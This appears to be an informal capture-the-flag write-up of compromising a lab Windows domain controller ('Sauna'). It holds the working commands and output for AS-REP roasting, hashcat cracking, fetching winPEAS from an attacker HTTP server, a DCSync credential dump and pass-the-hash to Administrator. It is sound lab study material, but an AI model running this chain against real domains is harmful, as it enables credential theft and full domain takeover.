After trying this bullshid i coudlnt get it goiiiin```bash
nmap -sV -sC 10.129.95.180 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-03 08:17 CST
Nmap scan report for 10.129.95.180
Host is up (0.0086s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-03 21:18:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2025-02-03T21:18:04
|_  start_date: N/A

```

Enum finds some interesting stuff like .local which triggers my neurons to kerbroast

```bash
enum4linux-ng 10.129.95.180 
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.95.180
[*] Username ......... ''
[*] Random Username .. 'pobkzzrc'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.95.180    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.95.180    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: EGOTISTICAL-BANK.LOCAL

 ==========================================
|    SMB Dialect Check on 10.129.95.180    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ============================================================
|    Domain Information via SMB session for 10.129.95.180    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: SAUNA
NetBIOS domain name: EGOTISTICALBANK
DNS domain: EGOTISTICAL-BANK.LOCAL
FQDN: SAUNA.EGOTISTICAL-BANK.LOCAL
Derived membership: domain member
Derived domain: EGOTISTICALBANK

 ====================================================
|    Domain Information via RPC for 10.129.95.180    |
 ====================================================
[+] Domain: EGOTISTICALBANK
[+] Domain SID: S-1-5-21-2966785786-3096785034-1186376766
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.129.95.180    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

```

After getting stuck i completely forgot they had a webserver, so going onto that i found a list of names 

```bash
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

After trying to use username-anarchy but giving up, i manually tested common username types such as fsmith f.smith fergus.smith etc. And we found the fsmith was the correct format!

```bash
python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile username.txt -dc-ip 10.129.95.180 -no-pass
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:d0bc47e5f21fb811877db18523db12f8$a6ec90f96eff53e075fd1cf73fc56bb562d298babdf253277248f61544dc8b545127415f28fbfbbdaaf3983379857a0aca8be79480c0d36ccc174b175201dceca8aa1c4ab496c482f59376ba3df7231a92b9724eed451c2276a2e9f70b66824049aa2c612c8266df097e6229239abbd6fc71c7a77943f164b648af4574cfcce2e3e53e811a99af4fef4236237ee5f1a7cc26d52ee91999abdfbc64c88af76d99c76387f61c4896b8cf9b26589aa2b7a6be8208abbb9a2de3d21ddc5b39787b711373678e7e002dedafe4b293eabca376fe6e97b8636fe7e2195a848371411bc5062ade41add2d5b095f16db599740ebfcd7558f0b8758b64d0a35bb6ac35f112

```

So after messing around a little, we went with hashcat. John wouldnt seem to work… In any case its important that the exact has format is put in as listed above for the crack to work

```bash
hashcat -m18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

Output

```bash
Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:d0bc47e5f21fb811877db18523db12f8$a6ec90f96eff53e075fd1cf73fc56bb562d298babdf253277248f61544dc8b545127415f28fbfbbdaaf3983379857a0aca8be79480c0d36ccc174b175201dceca8aa1c4ab496c482f59376ba3df7231a92b9724eed451c2276a2e9f70b66824049aa2c612c8266df097e6229239abbd6fc71c7a77943f164b648af4574cfcce2e3e53e811a99af4fef4236237ee5f1a7cc26d52ee91999abdfbc64c88af76d99c76387f61c4896b8cf9b26589aa2b7a6be8208abbb9a2de3d21ddc5b39787b711373678e7e002dedafe4b293eabca376fe6e97b8636fe7e2195a848371411bc5062ade41add2d5b095f16db599740ebfcd7558f0b8758b64d0a35bb6ac35f112:
Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:d0bc47e...35f112
Time.Started.....: Mon Feb  3 09:10:35 2025 (5 secs)
Time.Estimated...: Mon Feb  3 09:10:40 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1923.1 kH/s (0.82ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: Tiffany95 -> Thelittlemermaid

Started: Mon Feb  3 09:10:27 2025
Stopped: Mon Feb  3 09:10:42 2025

```

Giving us thestrokes23

fsmith@EGOTISTICAL-BANK.LOCAL

thestrokes23

```bash
evil-winrm -i 10.129.13.175 -u fsmith -p 'Thestrokes23'
```

User.txt’d

```bash
python3 -m http.server 8000
```

```bash
Invoke-WebRequest -Uri "http://10.10.14.211:8000/winPEASx64.exe" -OutFile "C:\Users\FSmith\winPEAS.exe"
```

```bash
C:\Users\FSmith\winPEAS.exe
```

To run winpeas (was saved in home dir)

```bash
Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================

    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================

    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   ==========================================================
```

This did not work, lets try something else

```bash
  [+] Looking for AutoLogon credentials(T1012)
Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround! 
```

Re reading the winpeas i see there are creds sat here, when you come back try bloodhound  

So after LOTS of trial and error, we figured out that sharphound can be put on the machine anmd ran that way simply by downloading and 

```bash
C:\Users\fsmith\sharphound.exe
```

we get the zip and send it back with a simple 

```bash
download C:\users\fsmith\20250306173054_BloodHound.zip
```

so, lets analyse but first the awful task of getting bloodhound going on new vm 

```bash

mkdir -p /usr/share/neo4j/logs
touch /usr/share/neo4j/logs/neo4j.log
neo4j start
```

then after entering neo4j password neo4j user

we can run bloodhound and get started 

This account has access to `GetChanges` and `GetChangesAll` on the domain. Googling that will quickly point to a load of articles on the DCSync attack, or I can right click on the label (you have to get in just the right spot) and get the menu for it:

so lets run the impacket tool, if this doesnt work mimikatz can be used too 

```bash
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.129.13.175'
```

```bash
RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:27e76fffcd989ffa9e0fdd90f418b192:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:b0e6a6d2d1b8e36fd1df213ec6e546715343f59aabb67d9a931c9c3f4d15e537
SAUNA$:aes128-cts-hmac-sha1-96:b15f067311990f3e94eda6e48d486ceb
SAUNA$:des-cbc-md5:5bc273fd0b5767ad
[*] Cleaning up... 

```

```bash
wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.129.13.175 administrator@10.129.13.175
```

gets root?! that easy 

can even use 

```bash
 evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e

```

the reason we can pass the hash is its an NTLM hash,  so the full hash lets break it down 

aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e 

So the red is : **LM Hash**: A legacy and insecure hash that isn’t really used in modern systems unless you’re dealing with very old or improperly configured machines.

**And the Yellow : NTLM Hash (`823452073d75b9d1cf70ebdf86c7f98e`)**: The important part of the hash, which you successfully used in the **Pass-the-Hash** attack with **wmiexec.py**.
